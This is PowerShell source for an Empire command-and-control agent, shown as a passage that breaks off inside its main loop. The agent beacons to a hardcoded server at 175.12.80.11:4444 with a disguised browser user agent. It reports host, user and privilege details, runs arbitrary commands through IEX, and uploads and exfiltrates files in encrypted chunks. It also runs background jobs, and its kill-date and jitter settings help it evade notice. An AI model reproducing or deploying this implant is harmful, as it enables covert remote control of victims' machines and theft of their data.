function Invoke-Empire {
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $StagingKey,
        [Parameter(Mandatory=$true)]
        [String]
        $SessionKey,
        [Parameter(Mandatory=$true)]
        [String]
        $SessionID,
        [Int32]
        $AgentDelay = 5,
        [Double]
        $AgentJitter = 0.0,
        [String[]]
        $Servers,
        [String]
        $KillDate,
        [Int32]
        $KillDays,
        [String]
        $WorkingHours,
        [String]
        $Profile = ""/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"",
        [Int32]
        $LostLimit = 60,
        [String]
        $DefaultResponse = ""PGh0bWw+PGJvZHk+PGgxPkl0IHdvcmtzITwvaDE+PHA+VGhpcyBpcyB0aGUgZGVmYXVsdCB3ZWIgcGFnZSBmb3IgdGhpcyBzZXJ2ZXIuPC9wPjxwPlRoZSB3ZWIgc2VydmVyIHNvZnR3YXJlIGlzIHJ1bm5pbmcgYnV0IG5vIGNvbnRlbnQgaGFzIGJlZW4gYWRkZWQsIHlldC48L3A+PC9ib2R5PjwvaHRtbD4=""
    )
    $Encoding = [System.Text.Encoding]::ASCII
    $HMAC = New-Object System.Security.Cryptography.HMACSHA256
    $script:AgentDelay = $AgentDelay
    $script:AgentJitter = $AgentJitter
    $script:LostLimit = $LostLimit
    $script:MissedCheckins = 0
    $script:ResultIDs = @{}
    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
    $Script:ServerIndex = 0
    $Script:ControlServers = $Servers
    $Retries = 1
    if($KillDays) {
        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
    }
    $ProfileParts = $Profile.split('|')
    $script:TaskURIs = $ProfileParts[0].split(',')
    $script:UserAgent = $ProfileParts[1]
    $script:SessionID = $SessionID
    $script:Headers = @{}
    if($ProfileParts[2]) {
        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
            $Parts = $_.Split(':')
            $script:Headers.Add($Parts[0],$Parts[1])
        }
    }
    $Script:Jobs = @{}
    $Script:Downloads = @{}
    $script:ImportedScript = ''
    function ConvertTo-Rc4ByteStream {
        Param ($In, $RCK)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }
    function Get-HexString {
        param([byte]$Data)
        ($Data | ForEach-Object { ""{0:X2}"" -f $_ }) -join ' '
    }
    function Set-Delay {
        param([int]$d, [double]$j=0.0)
        $script:AgentDelay = $d
        $script:AgentJitter = $j
        ""agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter""
    }
    function Get-Delay {
        ""agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter""
    }
    function Set-LostLimit {
        param([int]$l)
        $script:LostLimit = $l
        if($l -eq 0)
        {
            ""agent set to never die based on checkin Limit""
        }
        else
        {
            ""agent LostLimit set to $script:LostLimit""
        }
    }
    function Get-LostLimit {
        ""agent LostLimit: $script:LostLimit""
    }
    function Set-Killdate {
        param([string]$date)
        $script:KillDate = $date
        ""agent killdate set to $script:KillDate""
    }
    function Get-Killdate {
        ""agent killdate: $script:KillDate""
    }
    function Set-WorkingHours {
        param([string]$hours)
        $script:WorkingHours = $hours
        ""agent working hours set to $script:WorkingHours""
    }
    function Get-WorkingHours {
        ""agent working hours: $script:WorkingHours""
    }
    function Get-Sysinfo {
        $str = '0|' # no nonce for normal execution
        $str += $Script:ControlServers[$Script:ServerIndex]
        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
        $str+=""|$ip""
        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
        if(([Environment]::UserName).ToLower() -eq 'system') {
            $str += '|True'
        }
        else{
            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        }
        $n = [System.Diagnostics.Process]::GetCurrentProcess();
        $str += '|'+$n.ProcessName+'|'+$n.Id;
        $str += ""|powershell|"" + $PSVersionTable.PSVersion.Major;
        $str
    }
    function Invoke-ShellCommand {
        param($cmd, $cmdargs="""")
        if ($cmdargs -like ""*`""\\*"") {
            $cmdargs = $cmdargs -replace ""`""\\"",""FileSystem::`""\""
        }
        elseif ($cmdargs -like ""*\\*"") {
            $cmdargs = $cmdargs -replace ""\\\\"",""FileSystem::\\""
        }
        $output = ''
        if ($cmd.ToLower() -eq 'shell') {
            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
            else { $output = IEX ""$cmdargs"" }
            $output += ""`n`r..Command execution completed.""
        }
        else {
            switch -regex ($cmd) {
                '(ls|dir)' {
                    if ($cmdargs.length -eq """") {
                        $output = Get-ChildItem -force | select lastwritetime,length,name
                    }
                    else {
                        try{
                            $output = IEX ""$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name""
                        }
                        catch [System.Management.Automation.ActionPreferenceStopException] {
                            $output = ""[!] Error: $_ (or cannot be accessed).""
                        }
                    }
                }
                '(mv|move|copy|cp|rm|del|rmdir)' {
                    if ($cmdargs.length -ne """") {
                        try {
                            IEX ""$cmd $cmdargs -Force -ErrorAction Stop""
                            $output = ""executed $cmd $cmdargs""
                        }
                        catch {
                            $output=$_.Exception;
                        }
                    }
                }
                cd {
                    if ($cmdargs.length -ne '')
                    {
                        $cmdargs = $cmdargs.trim(""`"""").trim(""'"")
                        cd ""$cmdargs""
                        $output = pwd
                    }
                }
                '(ipconfig|ifconfig)' {
                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'Description' $_.Description
                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join "","")
                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join "","")
                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join "","")
                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join "","")
                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join "","")
                        $out
                    } | fl | Out-String | ForEach-Object {$_ + ""`n""}
                }
                '(ps|tasklist)' {
                    $owners = @{}
                    Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o=""$($o.Domain)\$($o.User)""}; $owners[$_.handle] = $o}
                    if($cmdargs -ne '') { $p = $cmdargs }
                    else{ $p = ""*"" }
                    $output = Get-Process $p | ForEach-Object {
                        $arch = 'x64'
                        if ([System.IntPtr]::Size -eq 4) {
                            $arch = 'x86'
                        }
                        else{
                            foreach($module in $_.modules) {
                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq ""wow64.dll"") {
                                    $arch = 'x86'
                                    break
                                }
                            }
                        }
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $out | Add-Member Noteproperty 'PID' $_.ID
                        $out | Add-Member Noteproperty 'Arch' $arch
                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
                        $mem = ""{0:N2} MB"" -f $($_.WS/1MB)
                        $out | Add-Member Noteproperty 'MemUsage' $mem
                        $out
                    } | Sort-Object -Property PID
                }
                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                route {
                    if (($cmdargs.length -eq '') -or ($cmdargs.lower() -eq 'print')) {
                        $adapters = @{}
                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
                            $out = New-Object psobject
                            $out | Add-Member Noteproperty 'Destination' $_.Destination
                            $out | Add-Member Noteproperty 'Netmask' $_.Mask
                            if ($_.NextHop -eq ""0.0.0.0"") {
                                $out | Add-Member Noteproperty 'NextHop' 'On-link'
                            }
                            else{
                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop
                            }
                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne """")) {
                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join "","")
                            }
                            else {
                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
                            }
                            $out | Add-Member Noteproperty 'Metric' $_.Metric1
                            $out
                        } | ft -autosize | Out-String
                    }
                    else { $output = route $cmdargs }
                }
                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name }
                hostname {
                    $output = [System.Net.Dns]::GetHostByName(($env:computerName))
                }
                '(reboot|restart)' { Restart-Computer -force }
                shutdown { Stop-Computer -force }
                default {
                    if ($cmdargs.length -eq '') { $output = IEX $cmd }
                    else { $output = IEX ""$cmd $cmdargs"" }
                }
            }
        }
        ""`n""+($output | Format-Table -wrap | Out-String)
    }
    $Download = @""
function Download-File {
    param(`$Type,`$Path,`$ResultID,`$ChunkSize,`$Delay,`$Jitter)
    `$Index = 0
    do{
        `$EncodedPart = Get-FilePart -File ""`$Path"" -Index `$Index -ChunkSize `$ChunkSize
        if (`$EncodedPart) {
            `$data = ""{0}|{1}|{2}"" -f `$Index,`$Path,`$EncodedPart
            Encode-Packet -type `$Type -data `$(`$data) -ResultID `$ResultID
            `$Index += 1
            if (`$Delay -ne 0) {
                `$min = [int]((1-`$Jitter)*`$Delay)
                `$max = [int]((1+`$Jitter)*`$Delay)
                if (`$min -eq `$max) {
                    `$sleepTime = `$min
                }
                else {
                    `$sleepTime = Get-Random -minimum `$min -maximum `$max;
                }
                Start-Sleep -s `$sleepTime;
            }
        }
        [GC]::Collect()
    } while(`$EncodedPart)
    Encode-Packet -type 40 -data ""[*] File download of `$Path completed"" -ResultID `$ResultID
}
function Encode-Packet {
    param([Int16]`$type, `$data, [Int16]`$ResultID=0)
    if (`$data -is [System.Array]) {
        `$data = `$data -join ""``n""
    }
    `$data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$data))
    `$packet = New-Object Byte[] (12 + `$data.Length)
    ([BitConverter]::GetBytes(`$type)).CopyTo(`$packet, 0)
    ([BitConverter]::GetBytes([Int16]1)).CopyTo(`$packet, 2)
    ([BitConverter]::GetBytes([Int16]1)).CopyTo(`$packet, 4)
    ([BitConverter]::GetBytes(`$ResultID)).CopyTo(`$packet, 6)
    ([BitConverter]::GetBytes(`$data.Length)).CopyTo(`$packet, 8)
    ([System.Text.Encoding]::UTF8.GetBytes(`$data)).CopyTo(`$packet, 12)
    `$packet
}
function Get-FilePart {
    Param(
        [string] `$File,
        [int] `$Index = 0,
        `$ChunkSize = 512KB,
        [switch] `$NoBase64
    )
    try {
        `$f = Get-Item ""`$File""
        `$FileLength = `$f.length
        `$FromFile = [io.file]::OpenRead(`$File)
        if (`$FileLength -lt `$ChunkSize) {
            if(`$Index -eq 0) {
                `$buff = new-object byte[] `$FileLength
                `$count = `$FromFile.Read(`$buff, 0, `$buff.Length)
                if(`$NoBase64) {
                    `$buff
                }
                else{
                    [System.Convert]::ToBase64String(`$buff)
                }
            }
 

           else{
                `$Null
            }
        }
        else{
            `$buff = new-object byte[] `$ChunkSize
            `$Start = `$Index * `$(`$ChunkSize)
            `$null = `$FromFile.Seek(`$Start,0)
            `$count = `$FromFile.Read(`$buff, 0, `$buff.Length)
            if (`$count -gt 0) {
                if(`$count -ne `$ChunkSize) {
                    `$buff2 = new-object byte[] `$count
                    [array]::copy(`$buff, `$buff2, `$count)
                    if(`$NoBase64) {
                        `$buff2
                    }
                    else{
                        [System.Convert]::ToBase64String(`$buff2)
                    }
                }
                else{
                    if(`$NoBase64) {
                        `$buff
                    }
                    else{
                        [System.Convert]::ToBase64String(`$buff)
                    }
                }
            }
            else{
                `$Null;
            }
        }
    }
    catch{}
    finally {
        `$FromFile.Close()
    }
}
""@
    function Start-DownloadJob {
        param($ScriptString, $type, $Path, $ResultID, $ChunkSize)
        $RandName = Split-Path -Path $Path -Leaf
        $AppDomain = [AppDomain]::CreateDomain($RandName)
        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
        $ScriptString = ""$ScriptString`n Download-File -Type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)""
        $null = $PSHost.AddScript($ScriptString)
        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]'
        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]))
        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))
        $Script:Downloads[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
        $RandName
    }
    function Get-DownloadJobCompleted {
        param($JobName)
        if($Script:Downloads.ContainsKey($JobName)) {
            $Script:Downloads[$JobName]['Job'].IsCompleted
        }
    }
    function Receive-DownloadJob {
        param($JobName)
        if($Script:Downloads.ContainsKey($JobName)) {
            $Script:Downloads[$JobName]['Buffer'].ReadAll()
        }
    }
    function Stop-DownloadJob {
        param($JobName)
        if($Script:Downloads.ContainsKey($JobName)) {
            $Null = $Script:Downloads[$JobName]['PSHost'].Stop()
            $Script:Downloads[$JobName]['Buffer'].ReadAll()
            $Null = [AppDomain]::Unload($Script:Downloads[$JobName]['AppDomain'])
            $Script:Downloads.Remove($JobName)
        }
    }
    function Start-AgentJob {
        param($ScriptString)
        $RandName = -join(""ABCDEFGHKLMNPRSTUVWXYZ123456789"".ToCharArray()|Get-Random -Count 6)
        $AppDomain = [AppDomain]::CreateDomain($RandName)
        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
        $null = $PSHost.AddScript($ScriptString)
        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]'
        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]))
        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))
        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
        $RandName
    }
    function Get-AgentJobCompleted {
        param($JobName)
        if($Script:Jobs.ContainsKey($JobName)) {
            $Script:Jobs[$JobName]['Job'].IsCompleted
        }
    }
    function Receive-AgentJob {
        param($JobName)
        if($Script:Jobs.ContainsKey($JobName)) {
            $Script:Jobs[$JobName]['Buffer'].ReadAll()
        }
    }
    function Stop-AgentJob {
        param($JobName)
        if($Script:Jobs.ContainsKey($JobName)) {
            $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
            $Script:Jobs[$JobName]['Buffer'].ReadAll()
            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
            $Script:Jobs.Remove($JobName)
        }
    }
    function Update-Profile {
        param($Profile)
        $ProfileParts = $Profile.split('|')
        $script:TaskURIs = $ProfileParts[0].split(',')
        $script:UserAgent = $ProfileParts[1]
        $script:SessionID = $SessionID
        $script:Headers = @{}
        if($ProfileParts[2]) {
            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
                $Parts = $_.Split(':')
                $script:Headers.Add($Parts[0],$Parts[1])
            }
        }
        ""Agent updated with profile $Profile""
    }
    function Encrypt-Bytes {
        param($bytes)
        $IV = [byte] 0..255 | Get-Random -count 16
        try {
            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        }
        catch {
            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
        }
        $AES.Mode = ""CBC"";
        $AES.Key = $Encoding.GetBytes($SessionKey);
        $AES.IV = $IV;
        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
        $HMAC.Key = $Encoding.GetBytes($SessionKey);
        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
    }
    function Decrypt-Bytes {
        param ($inBytes)
        if($inBytes.Length -gt 32) {
            $mac = $inBytes[-10..-1];
            $inBytes = $inBytes[0..($inBytes.length - 11)];
            $hmac.Key = $Encoding.GetBytes($SessionKey);
            $expected = $hmac.ComputeHash($inBytes)[0..9];
            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
                return;
            }
            $IV = $inBytes[0..15];
            try {
                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AES.Mode = ""CBC"";
            $AES.Key = $Encoding.GetBytes($SessionKey);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
        }
    }
    function New-RoutingPacket {
        param($EncData, $Meta)
        if($EncData) {
            $EncDataLen = $EncData.Length
        }
        else {
            $EncDataLen = 0
        }
        $SKB = $Encoding.GetBytes($StagingKey)
        $IV=[BitConverter]::GetBytes($(Get-Random));
        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen)
        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB)
        if($EncData) {
            ($IV + $RoutingPacketData + $EncData)
        }
        else {
            ($IV + $RoutingPacketData)
        }
    }
    function Decode-RoutingPacket {
        param($PacketData)
        if ($PacketData.Length -ge 20) {
            $Offset = 0
            while($Offset -lt $PacketData.Length) {
                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)]
                $RoutingIV = $RoutingPacket[0..3]
                $RoutingEncData = $RoutingPacket[4..19]
                $Offset += 20
                $SKB = $Encoding.GetBytes($StagingKey)
                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB)
                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7])
                $Language = $RoutingData[8]
                $Meta = $RoutingData[9]
                $Extra = $RoutingData[10..11]
                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12)
                if ($PacketLength -lt 0) {
                    break
                }
                if ($PacketSessionID -eq $script:SessionID) {
                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)]
                    $Offset += $PacketLength
                    Process-TaskingPackets $EncData
                }
                else {
                }
            }
        }
        else {
        }
    }
    function Encode-Packet {
        param([Int16]$type, $data, [Int16]$ResultID=0)
        if ($data -is [System.Array]) {
            $data = $data -join ""`n""
        }
        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
        $packet = New-Object Byte[] (12 + $data.Length)
        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0)
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2)
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4)
        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6)
        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8)
        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12)
        $packet
    }
    function Decode-Packet {
        param($packet, $offset=0)
        $Type = [BitConverter]::ToUInt16($packet, 0+$offset)
        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset)
        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset)
        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset)
        $Length = [BitConverter]::ToUInt32($packet, 8+$offset)
        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)])
        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)])
        Remove-Variable packet;
        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining)
    }
                    $Script:ControlServers = @(""http://175.12.80.11:4444"");
                    $Script:ServerIndex = 0;
                    function script:Get-Task {
                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith(""http"")) {
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
                                $wc = New-Object System.Net.WebClient
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add(""User-Agent"",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                $wc.Headers.Add(""Cookie"", ""session=$RoutingCookie"")
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                Start-Negotiate -S ""$ser"" -SK $SK -UA $ua
                            }
                        }
                    }
                    function script:Send-Message {
                        param($Packets)
                        if($Packets) {
                            $EncBytes = Encrypt-Bytes $Packets
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                $wc = New-Object System.Net.WebClient
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
                                try {
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                }
                                catch [System.Net.WebException]{
                                }
                            }
                        }
                    }
    function Process-Tasking {
        param($type, $msg, $ResultID)
        try {
            if($type -eq 1) {
                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID
            }
            elseif($type -eq 2) {
                $msg = ""[!] Agent ""+$script:SessionID+"" exiting""
                Send-Message -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID)
                exit
            }
            elseif($type -eq 40) {
                $parts = $data.Split("" "")
                if($parts.Length -eq 1) {
                    $cmd = $parts[0]
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join ""`n"").trim() -ResultID $ResultID
                }
                else{
                    $cmd = $parts[0]
                    $cmdargs = $parts[1..$parts.length] -join "" ""
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join ""`n"").trim() -ResultID $ResultID
                }
            }
            elseif($type -eq 41) {try {
                    $ChunkSize = 128KB
                    $Parts = $Data.Split("" "")
                    if($Parts.Length -gt 1) {
                        $Path = $Parts[0..($parts.length-2)] -join "" ""
                        try {
                            $ChunkSize = $Parts[-1]/1
                            if($Parts[-1] -notlike ""*b*"") {
                                $ChunkSize = $ChunkSize * 1024
                            }
                        }
                        catch {
                            $Path += "" $($Parts[-1])""
                        }
                    }
                    else {
                        $Path = $Data
                    }
                    $Path = $Path.Trim('""').Trim(""'"")
                    if($ChunkSize -lt 64KB) {
                        $ChunkSize = 64KB
                    }
                    elseif($ChunkSize -gt 4MB) {
                        $ChunkSize = 4MB
                    }
                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
                    $jobID = Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
                }
                catch {
                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
                }
            }
            elseif($type -eq 42) {
                $parts = $data.split('|')
                $filename = $parts[0]
                $base64part = $parts[1]
                $Content = [System.Convert]::FromBase64String($base64part)
                try{
                    Set-Content -Path $filename -Value $Content -Encoding Byte
                    Encode-Packet -type $type -data ""[*] Upload of $fileName successful"" -ResultID $ResultID
                }
                catch {
                    Encode-Packet -type 0 -data '[!] Error in writing file during upload' -ResultID $ResultID
                }
            }
            elseif($type -eq 50) {
                $Downloads = $Script:Jobs.Keys -join ""`n""
                Encode-Packet -data (""Running Jobs:`n$Downloads"") -type $type -ResultID $ResultID
            }
            elseif($type -eq 51) {
                $JobName = $data
                $JobResultID = $ResultIDs[$JobName]
                try {
                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
                    if($Results -and $($Results.trim() -ne '')) {
                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID
                    }
                    Encode-Packet -type 51 -data ""Job $JobName killed."" -ResultID $JobResultID
                }
                catch {
                    Encode-Packet -type 0 -data ""[!] Error in stopping job: $JobName"" -ResultID $JobResultID
                }
            }
            elseif($type -eq 52) {
                $RunningDownloads = $Script:Downloads.Keys -join ""`n""
                Encode-Packet -data (""Downloads:`n$RunningDownloads"") -type $type -ResultID $ResultID
            }
            elseif($type -eq 53) {
                $JobName = $data
                $JobResultID = $ResultIDs[$JobName]
                try {
                    $Results = Stop-DownloadJob -JobName $JobName
                    Encode-Packet -type 53 -data ""Download of $JobName stopped"" -ResultID $JobResultID
                }
                catch {
                    Encode-Packet -type 0 -data ""[!] Error in stopping Download: $JobName"" -ResultID $JobResultID
                }
            }
            elseif($type -eq 100) {
                $ResultData = IEX $data
                if($ResultData) {
                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID
                }
            }
            elseif($type -eq 101) {
                $prefix = $data.Substring(0,15)
                $extension = $data.Substring(15,5)
                $data = $data.Substring(20)
                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID
            }
            elseif($type -eq 110) {
                $jobID = Start-AgentJob $data
                $script:ResultIDs[$jobID]=$resultID
                Encode-Packet -type $type -data (""Job started: "" + $jobID) -ResultID $ResultID
            }
            elseif($type -eq 111) {
            }
            elseif($type -eq 120) {
                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
                Encode-Packet -type $type -data ""script successfully saved in memory"" -ResultID $ResultID
            }
            elseif($type -eq 121) {
                $script = Decrypt-Bytes $script:ImportedScript
                if ($script) {
                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + ""; $data"")
                    $script:ResultIDs[$jobID]=$ResultID
                    Encode-Packet -type $type -data (""Job started: "" + $jobID) -ResultID $ResultID
                }
            }
            else{
                Encode-Packet -type 0 -data ""invalid type: $type"" -ResultID $ResultID
            }
        }
        catch [System.Exception] {
            Encode-Packet -type $type -data ""error running command: $_"" -ResultID $ResultID
        }
    }
    function Process-TaskingPackets {
        param($Tasking)
        $TaskingBytes = Decrypt-Bytes $Tasking
        if (-not $TaskingBytes) {
            return
        }
        $Decoded = Decode-Packet $TaskingBytes
        $Type = $Decoded[0]
        $TotalPackets = $Decoded[1]
        $PacketNum = $Decoded[2]
        $TaskID = $Decoded[3]
        $Length = $Decoded[4]
        $Data = $Decoded[5]
        $Remaining = $Decoded[6]
        $ResultPackets = $(Process-Tasking $Type $Data $TaskID)
        $Offset = 12 + $Length
        while($Remaining.Length -ne 0) {
            $Decoded = Decode-Packet $TaskingBytes $Offset
            $Type = $Decoded[0]
            $TotalPackets = $Decoded[1]
            $PacketNum = $Decoded[2]
            $TaskID = $Decoded[3]
            $Length = $Decoded[4]
            $Data = $Decoded[5]
            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]}
            $ResultPackets += $(Process-Tasking $Type $Data $TaskID)
            $Offset += $(12 + $Length)
        }
        Send-Message -Packets $ResultPackets
    }
    while ($True) {
        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
            $Packets = $null
            ForEach($JobName in $Script:Jobs.Keys) {
                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
                $JobResultID = $script:ResultIDs[$JobName]
                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
                $script:ResultIDs.Remove($JobName)
            }
            ForEach($JobName in $Script:Downloads.Keys) {
                $Results = Stop-DownloadJob -JobName $JobName
                $JobResultID = $script:ResultIDs[$JobName]
                $Packets += $Results 
                $script:ResultIDs.Remove($JobName)
            }
            if ($Packets) {
                Send-Message -Packets $Packets
            }
            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
                $msg = ""[!] Agent ""+$script:SessionID+"" exiting: past killdate""
            }
            else {
                $msg = ""[!] Agent ""+$script:SessionID+"" exiting: Lost limit reached""
            }
